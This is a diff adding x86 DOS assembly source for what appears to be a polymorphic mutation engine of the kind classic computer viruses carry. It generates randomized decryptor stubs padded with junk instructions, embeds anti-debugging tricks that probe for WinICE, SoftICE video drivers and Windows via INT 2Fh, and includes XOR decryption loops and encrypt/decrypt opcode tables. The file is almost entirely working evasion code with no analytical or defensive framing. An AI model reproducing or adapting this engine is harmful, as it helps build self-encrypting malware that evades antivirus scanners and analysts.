+   ;--------------------------------------
+   ;MOV    AX,160AH
+   ;INT    2FH
+   ;AND    AX,AX
+   ;JE @@OK
+   ;RETN
+   ;@@OK:
+   TRICK_9     =   $-START
+           MOV CL,0AH
+   COMMON_CODE:    CALL    MOV_WIN
+   CMP_JE_AX:  MOV BX,(74H SHL 8) OR _AX       ;JE
+           JMP OR_JXX
+
+   ;--------------------------------------
+   ;MOV    AX,1687H
+   ;INT    2FH
+   ;AND    AX,AX
+   ;JE @@OK
+   ;RETN
+   ;@@OK:
+   ;PUSH   CS
+   ;POP    ES
+   TRICK_10    =   $-START
+           MOV CL,87H
+           CALL    COMMON_CODE
+           JMP RESTORE_ES
+
+   ;--------------------------------------
+   ;MOV    BX,X
+   ;MOV    AX,1684H
+   ;INT    2FH
+   ;AND    DI,DI
+   ;JE @@OK
+   ;RETN
+   ;@@OK:
+   ;PUSH   CS
+   ;POP    ES
+   TRICK_14    =   $-START
+           MOV CX,BCHECKER_ID
+           JMP GEN_DAPI_EP
+   TRICK_15    =   $-START
+           MOV CX,IMMUNER_ID
+           JMP GEN_DAPI_EP
+   TRICK_16    =   $-START
+           MOV CX,SIWVID_ID
+           JMP GEN_DAPI_EP
+   TRICK_11    =   $-START
+           MOV CX,WINICE_ID
+   GEN_DAPI_EP:    MOV BL,_BX
+           CALL    MOV_WREG
+           MOV CL,84H
+           CALL    MOV_WIN
+           MOV BX,(74H SHL 8) OR _DI       ;JE
+           CALL    OR_JXX_FREE
+   RESTORE_ES: MOV SMALL 1 PTR DS:DIRTY_SREG,_ES
+           JMP RESTORE_SREG
+
+   ;--------------------------------------
+   ;CALL   @@OK
+   ;DB $...
+   ;@@OK:
+   ;POP    DX
+   ;MOV    AX,900H
+   ;INT    21H
+   TRICK_12    =   $-START
+           INC SMALL 1 PTR DS:SHIT_FLAG
+           CALL    GET_RAND_3
+           ADD AL,15
+           ADD AX,DI
+           PUSH    AX
+           SUB AX,SMALL ENCRYPT_BUFF-100H
+           XCHG    AX,CX
+           CALL    GEN_CALL
+           POP AX
+           DEC SMALL 1 PTR DS:SHIT_FLAG
+           MOV 1 PTR [DI],'$'
+           XCHG    AX,DI
+           MOV AL,5AH              ;POP DX
+           STOSB
+           MOV BL,_DX
+           CALL    USED_WREG
+           MOV CH,9
+           CALL    MOV_AH
+           MOV SMALL 1 PTR DS:DIRTY_SREG,_ES
+   GEN_INT21:  MOV BH,21H
+           JMP INT_XX
+
+   ;--------------------------------------
+   ;XOR    BX,BX
+   ;MOV    AX,1683H
+   ;INT    2FH
+   ;AND    BX,BX
+   ;JNE    @@OK
+   ;RETN
+   ;@@OK:
+   TRICK_13    =   $-START
+           MOV BL,_BX
+           CALL    MOV_ZERO16
+           MOV CL,83H
+           CALL    MOV_WIN
+           MOV BX,(75H SHL 8) OR _BX       ;JNE
+   OR_JXX_FREE:    DEC SMALL 1 PTR DS:DIRTY_WREG   ;FREE _AX
+   OR_JXX:     XOR CX,CX
+           JMP CHECK_REG
+
+   ;--------------------------------------
+   ;MOV    BX,X    ;ENUM   {STDIN,STDOUT,STDERR}
+   ;MOV    AX,4407H
+   ;INT    21H
+   ;CMP    AL,0FFH
+   ;JE @@OK
+   ;RETN
+   ;@@OK:
+   TRICK_17    =   $-START
+           CALL    GET_RAND_3
+           XCHG    AX,CX
+           MOV BL,_BX
+           CALL    MOV_WREG
+           MOV CX,4407H
+           CALL    MOV_AX
+           PUSH    -1
+           PUSH    CMP_JE_AL
+           JMP GEN_INT21
+
+   ;--------------------------------------
+   ;MOV    AX,4A04H/1612H
+   ;INT    2FH
+   ;AND    AX,AX
+   ;JE @@OK
+   ;RETN
+   ;@@OK:
+   ;PUSH   CS
+   ;POP    ES
+   TRICK_18    =   $-START
+           MOV CX,4A04H
+           JMP INT2F_ES
+   TRICK_19    =   $-START
+           MOV CX,1612H
+   INT2F_ES:   CALL    MOV_INT2F
+           CALL    CMP_JE_AX
+           JMP RESTORE_ES
+
+   ;--------------------------------------
+   VIA_INT21_0 =   $-START
+           XOR CH,CH
+   GEN_INT21_1:    CALL    MOV_AH
+           JMP GEN_INT21
+
+   ;--------------------------------------
+   VIA_INT21_4C    =   $-START
+           MOV CH,4CH
+           JMP GEN_INT21_1
+
+   ;--------------------------------------
+   ;ENTRY: CL=CHECK NUMBER/BH=JAE/JBE
+   CMP_JXX_AL: XOR CH,CH
+           MOV BL,CH               ;AX
+           CALL    DX
+           JE  CHECK_REG
+           XOR BH,4                ;JA/JB
+           TEST    BH,AL
+           JNE IS_JA
+           INC CX
+           CMP AL,12H
+           ORG $-1
+   IS_JA:      DEC CX
+
+   ;--------------------------------------
+   ;ENTRY: BL=REG NUMBER
+   ;       BH=JXX CODE (JA/JAE/JB/ETC)
+   ;       CX=CHECK NUMBER (IF CX=0 THEN ASSUME THAT REG IS WORD,
+   ;                        IF CX!=0 THEN ASSUME THAT REG IS AL)
+   ;1. CMP
+   ;2. IF CX=0: OR/TEST/AND
+   CHECK_REG:  CALL    USED_WREG
+           CALL    GET_SHIT
+           MOV AL,4
+           JCXZ    GET_METHOD
+           MOV AL,1
+   GET_METHOD: CALL    GET_RAND_BYTE
+           JNE NO_CMP_IMM
+           AND BL,BL
+           JNE IS_NOT_AX
+           CALL    DX
+           JNE IS_NOT_AX
+           MOV AL,3DH              ;CMP AX
+           JCXZ    IS_CMP_WORD
+           DEC AX
+           STOSB
+           JMP STORE_BYTE
+   IS_NOT_AX:  MOV AX,0F883H           ;CMP REG16,IMM8
+           OR  AH,BL
+           JCXZ    IS_CMP_WORD
+           MOV AL,80H              ;CMP REG8,IMM8
+   IS_CMP_WORD:    STOSW
+   STORE_BYTE: XCHG    AX,CX
+           STOSB
+           JMP GET_JXX
+   NO_CMP_IMM: MOV CX,0C085H           ;TEST
+           DEC AX
+           JE  STORE_OPCODE
+           MOV CL,21H              ;AND
+           DEC AX
+           JE  STORE_OPCODE
+           MOV CL,9                ;OR
+   STORE_OPCODE:   OR  CH,BL
+           SHL BL,3
+           OR  CH,BL
+           XCHG    AX,CX
+           STOSW
+   GET_JXX:    MOV AL,BH
+           STOSB
+           PUSH    DI              ;ADDRESS FOR CORRECT JXX
+           STOSB
+   ;-------------------------------------
+   ;GET EXIT CODE:
+   ;1. RETN / RETN XXXX
+   ;2. JMP(CALL) 0
+   ;3. INT 20H
+   ;4. MOV AX,0/INT 21H
+   ;5. MOV AX,4CXXH/INT 21H
+           MOV SMALL 1 PTR DS:DIRTY_WREG,FREE_WREG
+           CALL    GET_SHIT
+           MOV SI,PROC_EXIT
+           MOV AL,SIZE_PROC_EXIT
+           CALL    CALL_RANDOM
+           CALL    GET_RAND_3
+           ADD DI,AX
+           POP AX
+           PUSH    DI
+           XCHG    AX,DI
+           DEC AX
+           SUB AX,DI
+           STOSB
+           POP DI
+           JMP GET_SHIT
+
+   ;------------------------------------------------
+   INT_SHIT    =   $-START
+           CALL    DX
+           MOV SI,INT21_AX
+           MOV BH,21H
+           JE  FAKE_INT
+           MOV SI,INT2F_AX
+           MOV BH,2FH
+   FAKE_INT:   LODSB
+           CALL    GET_RAND_BYTE
+           SHL AX,1
+           ADD SI,AX
+           LODSW
+           PUSH    BX
+           CMP AL,0FFH
+           XCHG    AX,CX
+           JNE IS_WORD_FN
+           CALL    MOV_AH
+           JMP GEN_FAKE_INT
+   IS_WORD_FN: CALL    MOV_AX
+   GEN_FAKE_INT:   POP BX
+           JMP INT_XX
+
+   ;--------------------------------------
+   VIA_INT20   =   $-START
+           MOV BH,20H
+           JMP INT_XX
+
+   ;--------------------------------------
+   MOV_WIN:    MOV CH,16H
+   MOV_INT2F:  CALL    MOV_AX
+           MOV BH,2FH
+
+   ;--------------------------------------
+   ;ENTRY: BH - INT NUMBER
+   ;1. 0CD,XX
+   ;2. ZERO DS(ES)/PUSHF/CALL 4 PTR ES(DS):4*XX
+   ;3. only for INT 21H: PUSH CS/MOV AX,50H/CALL AX
+   INT_XX:     MOV AL,3
+           CMP BH,21H
+           JE  IS_DOS_SERVICE
+           DEC AX
+           CMP CH,16H
+           JNE IS_DOS_SERVICE
+           DEC AX
+   IS_DOS_SERVICE: CALL    GET_RAND_BYTE
+           JNE NO_TRIVIAL
+           MOV BL,0CDH
+           XCHG    AX,BX
+           STOSW
+           RETN
+   NO_TRIVIAL: DEC AX
+           JNE FOR_DOS_SRVC
+   ;--------------------------------------
+   ;1.PUSH 0(0000)/POP SEG
+   ;2.ZERO WREG:
+   ;  2.1 MOV SREG,WREG
+   ;  2.2 PUSH WREG/POP SREG
+           MOV SI,DIRTY_SREG
+           LODSB
+           CMP AL,FREE_SREG
+           JNE IS_ES
+           CALL    DX
+           JE  IS_ES
+           MOV AL,_DS SHL 3
+   IS_ES:      MOV [SI-1],AL
+           XCHG    AX,CX
+           CALL    DX
+           JNE VIA_WREG
+           PUSH    AX
+           CALL    DX
+           SHL AL,1
+           OR  AL,68H
+           STOSB
+           POP AX
+           JP  IS_BYTE
+           STOSB
+   IS_BYTE:    JMP POP_STACK
+   VIA_WREG:   CALL    GET_FREE_REG
+           PUSH    CX
+           CALL    MOV_ZERO16
+           CALL    GET_SHIT
+           CALL    UNUSED_WREG
+           CALL    DX
+           POP CX
+           JE  VIA_STACK
+           MOV AL,8EH              ;MOV SREG,WREG
+           STOSB
+           MOV AL,0C0H
+           OR  AL,BL
+           JMP END_CLEAR
+   VIA_STACK:  MOV AL,50H              ;PUSH WREG
+           OR  AL,BL
+   POP_STACK:  STOSB
+           CALL    GET_SHIT
+           MOV AL,7                ;POP SREG
+   END_CLEAR:  OR  AL,CL
+           STOSB
+           CALL    GET_SHIT
+           MOV AL,9CH              ;PUSHF
+           STOSB
+           CALL    GET_SHIT
+           MOV AL,26H              ;ES: (MIN)
+           OR  AL,CL
+           STOSB
+           MOV AX,1EFFH            ;CALL FAR
+           STOSW
+           MOV AL,BH
+           CBW
+           SHL AX,2
+           STOSW                   ;INT ADDRESS
+           CALL    GET_SHIT
+   ;--------------------------------------
+   RESTORE_SREG:   CALL    PUSH_SREG           ;DIRTY_SREG=SEG NUMBER
+           MOV AL,FREE_SREG
+           XCHG    AL,SMALL 1 PTR DS:DIRTY_SREG    ;SET DIRTY_SREG TO FREE
+           OR  AL,7                ;POP SREG
+           STOSB
+           RETN
+   ;--------------------------------------
+   FOR_DOS_SRVC:   MOV CX,50H
+   GEN_PUSH_CALL:  CALL    PUSH_SREG
+   GEN_CALL:   XOR BL,BL
+   ;--------------------------------------
+   ;ENTRY: BL=0 FOR CALL/1 FOR JMP
+   ;       CX=OFFSET
+   GEN_JMPCALL:    CALL    DX
+           JNE CALL_VIA_WREG
+           MOV AL,0E8H             ;CALL NEAR
+           OR  AL,BL
+           STOSB
+           MOV AX,DI
+           SUB AX,SMALL ENCRYPT_BUFF-100H-2
+           SUB AX,CX
+           NEG AX
+           STOSW
+           RETN
+   CALL_VIA_WREG:  AND BL,BL
+           PUSHF
+           CALL    GET_FREE_REG
+           CALL    MOV_WREG
+           POPF
+           MOV AX,0D0FFH           ;CALL WREG
+           JE  IS_CALL
+           MOV AH,0E0H             ;JMP WREG
+   IS_CALL:    OR  AH,BL
+           STOSW
+   ;--------------------------------------
+   UNUSED_WREG:    PUSH    CX
+           MOV CL,BL
+           MOV AL,1
+           SHL AL,CL
+           XOR SMALL 1 PTR DS:DIRTY_WREG,AL
+           POP CX
+           RETN
+
+   ;--------------------------------------
+   PSPCALL_SHIT    =   $-START
+           MOV CX,52H
+           JMP GEN_PUSH_CALL
+
+   ;--------------------------------------
+   VIA_JMPCALL =   $-START
+           CALL    DX
+           XCHG    AX,BX
+           XOR CX,CX
+           JMP GEN_JMPCALL
+
+   ;--------------------------------------
+   MOVREG_SHIT =   $-START
+           CALL    GET_FREE_REG
+           CALL    GET_RAND_WORD
+           XCHG    AX,CX
+           CALL    MOV_WREG
+           JMP UNUSED_WREG
+
+   ;--------------------------------------
+   INCDEC_SHIT =   $-START
+           CALL    GET_FREE_REG
+           CALL    DX
+           SHL AL,3
+           OR  AL,40H              ;INC/DEC
+   SET_XCHG:   OR  AL,BL
+           STOSB
+           JMP UNUSED_WREG
+
+   ;--------------------------------------
+   XCHG_SHIT   =   $-START
+           CALL    GET_FREE_REG
+           MOV AL,90H              ;XCHG(NOP)
+           JMP SET_XCHG
+
+   ;--------------------------------------
+   GET_VALID_SREG: CALL    GET_RAND_3
+           INC AX              ;CS,SS,DS
+           SHL AL,3
+           CMP AL,SMALL 1 PTR DS:DIRTY_SREG
+           JE  GET_VALID_SREG
+           RETN
+
+   ;--------------------------------------
+   ;EXIT: BL=SOME WREG
+   GET_FREE_REG:   PUSH    DI
+           MOV DI,WREG_LIST
+           XOR BL,BL
+           MOV AH,[DI-1]           ;SMALL 1 PTR DS:DIRTY_WREG
+           XOR AL,AL
+           PUSH    DI
+   FILL_WREG_LIST: SHR AH,1
+           JB  NO_VALID_WREG
+           STOSB
+           INC BX
+   NO_VALID_WREG:  INC AX
+           CMP AL,8
+           JNE FILL_WREG_LIST
+           POP DI
+           MOV AL,BL
+           CALL    GET_RAND_BYTE
+           ADD DI,AX
+           MOV BL,[DI]
+           POP DI
+
+   ;--------------------------------------
+   USED_WREG:  PUSH    CX
+           MOV CL,BL
+           MOV AL,1
+           SHL AL,CL
+           OR  SMALL 1 PTR DS:DIRTY_WREG,AL
+           POP CX
+           RETN
+
+   ;--------------------------------------
+   MOV_ZERO32: DB  66H
+   MOV_ZERO16: XOR CX,CX
+           JMP MOV_WREG
+   MOV_AH:     CALL    GET_RAND_WORD
+           MOV CL,AL
+   MOV_AX:     MOV BL,_AX
+   ;ECX=CONST,BL=REG NUM
+   ;1. PUSH CONST (68/6A)/POP REG
+   ;2. MOV REG,CONST (0B8H OR REG)
+   ;3. XOR(SUB/MOV 0) REG/ADD(SUB NEG/OR/XOR)
+   MOV_WREG:   CALL    GET_RAND_3
+   NULL_WREG:  JNE IS_MOV_IMM
+           MOV AL,68H              ;PUSH IMM
+           CALL    CHECK_SIGN
+           STOSB
+           MOV EAX,ECX
+           STOSB
+           JNB IS_IMM8
+           DEC DI
+           CALL    STORE32
+   IS_IMM8:    CALL    GET_SHIT
+           MOV AL,58H              ;POP WREG
+           OR  AL,BL
+           STOSB
+   USED_SHIT:  CALL    USED_WREG
+           JMP GET_SHIT
+   IS_MOV_IMM: DEC AX
+           JNE IS_MOV
+           MOV AL,0B8H             ;MOV
+           OR  AL,BL
+           STOSB
+           MOV EAX,ECX
+   SAVE_OPCODE:    CALL    STORE32
+   SET_USED:   JMP USED_SHIT
+   IS_MOV:     CALL    GET_RAND_3
+           JNE NO_CALL_MOV
+           PUSH    ECX
+           XOR ECX,ECX
+           CALL    DX
+           CALL    NULL_WREG
+           POP ECX
+           JMP SET_WREG
+   NO_CALL_MOV:    DEC AX
+           JE  NO_CLEAR_XOR
+           MOV AL,31H-29H          ;XOR
+   NO_CLEAR_XOR:   ADD AX,1829H            ;SUB
+           OR  AH,BL
+           SHL AH,3
+           OR  AH,BL
+           XCHG    AX,SI
+           CALL    DX
+           SHL AL,1
+           OR  AX,SI
+           STOSW
+           CALL    USED_SHIT
+   SET_WREG:   JECXZ   SET_USED
+           CALL    GET_RAND_4
+           PUSH    ECX
+           DEC AX
+           MOV AH,0F0H             ;XOR
+           JS  IS_CASE
+           MOV AH,0C8H             ;OR
+           JE  IS_CASE
+           MOV AH,0C0H             ;ADD
+           DEC AL
+           JE  IS_CASE
+           MOV AH,0E8H             ;SUB
+           NEG ECX
+   IS_CASE:    OR  AH,BL
+           MOV AL,81H
+           CALL    CHECK_SIGN
+           STOSW
+           XCHG    EAX,ECX
+           JB  SAVE_CONST
+           STOSB
+           JMP CONST_SAVED
+   SAVE_CONST: CALL    STORE32
+   CONST_SAVED:    POP ECX
+           JMP GET_SHIT
+
+   ;--------------------------------------
+   CHECK_SIGN: AND BP,BP
+           JE  $+3
+           DB  66H
+           CMP CX,7FH
+           JB  SET_EXT_BIT
+           AND BP,BP
+           JE  $+3
+           DB  66H
+           CMP CX,-80H
+           JB  NO_SET_BIT
+   SET_EXT_BIT:    OR  AL,2
+   NO_SET_BIT: RETN
+
+   ;--------------------------------------
+   STORE32:    AND BP,BP
+           JE  BIT16
+           DB  66H             ;STOSD
+   BIT16:      STOSW
+           RETN
+
+   ;--------------------------------------
+   GET_SHIT_32:    PUSH    AX SI
+           CALL    GET_RAND_8
+           JNE NO_SHIT
+           MOV AL,LEN_SIMPLE32
+           CALL    GET_RAND_BYTE
+           ADD AX,SMALL SIMPLE_OP
+           XCHG    SI,AX
+           MOVSB
+   NO_SHIT:    POP SI AX
+           RETN
+
+   ;--------------------------------------
+   GET_SHIT:   AND BP,BP
+           JNE GET_SHIT_32
+           CALL    DX
+           JE  NO_GET_SHIT
+           MOV SI,SHIT_FLAG
+           CMP AL,[SI]
+           JBE ALL_SHIT
+           TEST    AL,[SI+2]           ;SMALL 1 PTR DS:DIRTY_WREG
+           MOV AL,SIZE_SHIT
+           JE  ALL_SHIT
+           SUB AL,SIZE_LAST_SHIT
+   ALL_SHIT:   INC 1 PTR [SI]
+           PUSH    BX CX
+           MOV SI,PROC_SHIT
+           CALL    CALL_RANDOM
+           POP CX BX
+           DEC SMALL 2 PTR DS:SHIT_FLAG
+   NO_GET_SHIT:    RETN
+
+   ;--------------------------------------
+   PUSH_SREG:  CALL    GET_VALID_SREG
+           ADD AL,6                ;PUSH SREG
+           STOSB
+           JMP GET_SHIT
+
+   ;--------------------------------------
+   ONE_SHIT    =   $-START
+           MOV AL,LEN_SIMPLE_OP
+           CALL    GET_RAND_BYTE
+           ADD AX,SMALL SIMPLE_OP
+           XCHG    AX,SI
+           MOVSB
+           CMP 1 PTR [DI-1],0CDH
+           JNE NO_INT
+           MOV AL,3FH-34H+1
+           CALL    GET_RAND_BYTE
+           ADD AL,34H
+           STOSB
+   NO_INT:     RETN
+
+   ;--------------------------------------
+   SMASHTOP_SHIT   =   $-START
+           CMP SMALL 1 PTR DS:DIRTY_SREG,_DS SHL 3
+           JNE NO_PREFIX
+           CALL    GET_VALID_SREG
+           ADD AL,26H              ;ES:
+           STOSB
+   NO_PREFIX:  CALL    GET_ENCRYPT
+           PUSHF
+   RAND_OFFSET:    MOV SI,ENCRYPT_BUFF
+           MOV AX,DI
+           SUB AX,SI
+           CALL    GET_RAND
+           ADD SI,AX
+           CMP 1 PTR [SI],'$'
+           JE  RAND_OFFSET
+           INC AH
+           STOSW
+           POPF
+           JA  WAS_UNARE
+           CALL    GET_RAND_BYTE
+           STOSB
+   WAS_UNARE:  RETN
+
+   ;--------------------------------------
+   VIA_RETN    =   $-START
+           CALL    DX
+           OR  AL,0C2H
+           STOSB
+           JP  IS_RETN             ;IF 0C3H
+           CALL    GET_RAND_WORD
+           OR  AH,10H              ;MIN=1000H
+           STOSW
+   IS_RETN:    RETN
+
+   ;--------------------------------------
+   AX_SHIT     =   $-START
+           MOV AL,LEN_AX_OP
+           CALL    GET_RAND_BYTE
+           ADD AX,SMALL AX_OP
+           XCHG    AX,SI
+           MOVSB
+           RETN
+
+   ;--------------------------------------
+   GET_RAND_WORD:  XOR AL,AL
+           CMP AX,1234H
+           ORG $-2
+
+   ;--------------------------------------
+   GET_RAND_8: MOV AL,8
+           CMP AX,1234H
+           ORG $-2
+
+   ;--------------------------------------
+   GET_RAND_4: MOV AL,4
+           CMP AX,1234H
+           ORG $-2
+
+   ;--------------------------------------
+   GET_RAND_3: MOV AL,3
+           CMP AX,1234H
+           ORG $-2
+
+   ;--------------------------------------
+   OFF_GET_RAND_2  =   $-START
+   GET_RAND_2: MOV AL,2
+
+   ;--------------------------------------
+   GET_RAND_BYTE:  XOR AH,AH
+
+   ;--------------------------------------
+   ;ENTRY: AX=(LIMIT-1) OR EAX=0 IF INFINITY
+   ;EXIT: AX=RANDOM VALUE, ZF=1 IF ZERO
+   GET_RAND    PROC
+           MOVZX   EAX,AX
+           PUSH    DX EAX
+           MOV EAX,SMALL 4 PTR DS:RANDOMIZE
+           MOV EDX,3A7FDH
+           MUL EDX
+           POP EDX
+           ADD EAX,269EC3H
+           MOV SMALL 4 PTR DS:RANDOMIZE,EAX
+           AND DX,DX
+           JE  NO_LIMITED
+           MUL EDX
+           XCHG    AX,DX
+   NO_LIMITED: AND AX,AX
+           POP DX
+           RET
+           ENDP
+
+   ;--------------------------------------
+   DECRYPTOR   =   $-START
+   RELO_DECRYPT:   MOV AX,1234H
+   FIRST_MASK  =   $-START-2
+           MOV CX,OUR_LEN
+           CALL    DOS_OFF_CALC
+   DOS_OFF_CALC:   POP DI
+   DECRYPT_BYTE:   XOR [DI+DECRYPT_DELTA],AX
+           INC DI
+           SUB AX,1234H
+   SECOND_MASK =   $-START-2
+           LOOP    DECRYPT_BYTE
+   DECRYPT_DELTA   =   $-DOS_OFF_CALC
+   LEN_DECRYPTOR   =   $-RELO_DECRYPT
+
+   ;--------------------------------------
+   ;DATA FOR SPE16
+   ;IF (LOBYTE)=0FFH THEN IT'S RANDOM
+   INT21_AX    =   $-START
+           DB  LEN21_AX
+   INT21_TBL   DW  0BFFH,18FFH,19FFH,20FFH,3303H,3304H,54FFH,5800H,5802H
+   LEN21_AX    =   ($-INT21_TBL)/2
+
+   INT2F_AX    =   $-START
+           DB  LEN2F_AX
+   INT2F_TBL   DW  1600H,1686H,4300H
+           DW  100H,500H,600H,1000H,1100H,1400H,1A00H,1B00H,4000H
+   LEN2F_AX    =   ($-INT2F_TBL)/2
+
+   SIMPLE_OP   =   $-START
+   SIMPLE_TBL:
+           CLC                 ;<-
+           STC
+           CMC
+           SAHF
+           NOP
+           REPE
+           REPNE
+           SEGES
+           SEGSS
+           SEGDS                   ;<- USE IN SPE32
+   LEN_SIMPLE32    =   $-SIMPLE_TBL
+
+           STI
+           CLI
+           CLD
+           STD
+           INTO
+           SEGCS
+           DB  0CDH                ;ANTI-TD (INT 34H-3FH)
+   LEN_SIMPLE_OP   =   $-SIMPLE_TBL
+
+   AX_OP       =   $-START
+   AX_TBL:
+           DAA
+           DAS
+           AAA
+           AAS
+           CBW
+           LAHF
+           DB  0D6H                ;SETALC
+           XLAT
+   LEN_AX_OP   =   $-AX_TBL
+
+   PROC_SHIT   =   $-START
+   PSHIT_RELO  DW  ONE_SHIT,SMASHTOP_SHIT,PSPCALL_SHIT,MOVREG_SHIT
+           DW  INCDEC_SHIT
+   AXSHIT_RELO DW  XCHG_SHIT,AX_SHIT,INT_SHIT  ;ALWAYS LAST
+   SIZE_SHIT   =   ($-PSHIT_RELO)/2
+   SIZE_LAST_SHIT  =   ($-AXSHIT_RELO)/2
+
+   PROC_EXIT   =   $-START
+   EXIT_RELO   DW  VIA_RETN,VIA_JMPCALL,VIA_INT20,VIA_INT21_0,VIA_INT21_4C
+   SIZE_PROC_EXIT  =   ($-EXIT_RELO)/2
+
+   ;--------------------------------------
+   TRICK_TBL   =   $-START
+   TRICK_RELO:
+           DW  TRICK_1,TRICK_2,TRICK_3,TRICK_4,TRICK_5,TRICK_6,TRICK_7
+           DW  TRICK_8,TRICK_9,TRICK_10,TRICK_11,TRICK_12,TRICK_13
+           DW  TRICK_14,TRICK_15,TRICK_16,TRICK_17,TRICK_18,TRICK_19
+   SIZE_TRICK_TBL  =   ($-TRICK_RELO)/2
+   ;ALSO MAY INCLUDED (WITH SOME CODE CHANGING IN GENERATING VALID SREG AND
+   ;ASSUMES ON ENTRY CHECK_REG SUBROUTINE):
+   ;1. AH=2AH - GET SYSTEM DATE (CHECKING VALID RETURN PARAM)
+   ;2. AH=2CH - GET SYSTEM TIME (AS ABOVE)
+   ;3. AH=2FH - GET DTA (BX=80H/ES RESTORED)
+   ;4. AX=3305H - GET BOOT DRIVE (DL=1...1AH)
+   ;5. AX=3306H - GET TRUE DOS VERSION (BL>=7)
+   ;6. AX=1611H - WIN9X SPECIFIC (AX=0/DS RESTORED)
+   ;7. AX=4A33H - CHECK MS-DOS VER 7 (AS ABOVE)
+   ;8. AX=4B21H - WIN.COM IS ACTIVE? (AH=0)
+
+   ;--------------------------------------
+   ENCRYPT_TBL =   $-START
+   ENCRYPT_RELO:   XOR 1 PTR DS:[1234H],12H
+           ORG $-3
+           ADD 1 PTR DS:[1234H],12H
+           ORG $-3
+           SUB 1 PTR DS:[1234H],12H
+           ORG $-3
+           ROL 1 PTR DS:[1234H],2
+           ORG $-3
+           ROR 1 PTR DS:[1234H],2
+           ORG $-3
+           DEC 1 PTR DS:[1234H]
+           ORG $-2
+           INC 1 PTR DS:[1234H]
+           ORG $-2
+           ROL 1 PTR DS:[1234H],1
+           ORG $-2
+           ROR 1 PTR DS:[1234H],1
+           ORG $-2
+           NOT 1 PTR DS:[1234H]
+           ORG $-2
+           NEG 1 PTR DS:[1234H]
+           ORG $-2
+   SIZE_ENCRYPT_TBL =  $-ENCRYPT_RELO
+
+   DECRYPT_TBL:    XOR 1 PTR [BX],CL
+           SUB 1 PTR [BX],CL
+           ADD 1 PTR [BX],CL
+           ROR 1 PTR [BX],CL
+           ROL 1 PTR [BX],CL
+           INC 1 PTR [BX]
+           DEC 1 PTR [BX]
+           ROR 1 PTR [BX],1
+           ROL 1 PTR [BX],1
+           NOT 1 PTR [BX]
+           NEG 1 PTR [BX]
+
+   ;--------------------------------------
+   ;DATA FOR SPE32
+   INIT_LIST   =   $-START
+           DB  LEN_INIT_LIST
+   INIT_LIST_RELO  DW  INIT_OFF,INIT_COUNT,INIT_MASK
+   LEN_INIT_LIST   =   ($-INIT_LIST_RELO)/2
+
+   LOOP_LIST   =   $-START
+           DB  LEN_LOOP_LIST
+   LOOP_LIST_RELO  DW  CHANGE_MASK_REG,MOV_WORK_REG,CHANGE_WORK_REG
+           DW  STORE_WORK_REG,CHANGE_OFF_REG
+   LEN_LOOP_LIST   =   ($-LOOP_LIST_RELO)/2
+
+   ;EBX=WORK_REG FOR CRYPTING
+           DW  0CB0FH              ;BSWAP EBX (ALWAYS TOP)
+           DW  0DBF7H              ;NEG EBX
+           DW  0D3F7H              ;NOT EBX
+           DW  0CBD1H              ;ROR EBX,1
+           DW  0C3D1H              ;ROL EBX,1
+           DW  4390H               ;INC EBX
+           DW  4B90H               ;DEC EBX
+           DW  0CBC1H              ;ROR EBX
+           DW  0C3C1H              ;ROL EBX
+           DW  0EB81H              ;SUB EBX
+           DW  0C381H              ;ADD EBX
+           DW  0F381H              ;XOR EBX
+           DW  0FBBAH              ;BTC (SKIP 0FH)
+   OP32_IMM    =   $-START
+   OP32_IMM_RELO   DW  0F8BAH              ;BTC (SKIP 0FH)
+           DW  0F081H              ;XOR
+           DW  0E881H              ;SUB
+           DW  0C081H              ;ADD
+           DW  0C8C1H              ;ROR X
+           DW  0C0C1H              ;ROL X
+           DW  4090H               ;INC (ONE BYTE)
+           DW  4890H               ;DEC (ONE BYTE)
+           DW  0C8D1H              ;ROR 1
+           DW  0C0D1H              ;ROL 1
+           DW  0D0F7H              ;NOT
+           DW  0D8F7H              ;NEG
+           DW  0C80FH              ;BSWAP (ALWAYS BOTTOM)
+   LEN_OP32_IMM    =   ($-OP32_IMM_RELO)/2
+
+   OP32_REG    =   $-START
+           DB  0BH             ;OR  (09H)
+   OP32_REG_CHG    =   $-START
+   OP32_REG_CHG_RELO DB    33H             ;XOR (31H)
+           DB  03H             ;ADD (01H)
+           DB  2BH             ;SUB (29H)
+   LEN_OP32_REG_CHG =  $-OP32_REG_CHG_RELO
+   ;FOR CRYPTING
+           DB  33H             ;XOR
+           DB  2BH             ;SUB
+           DB  03H             ;ADD
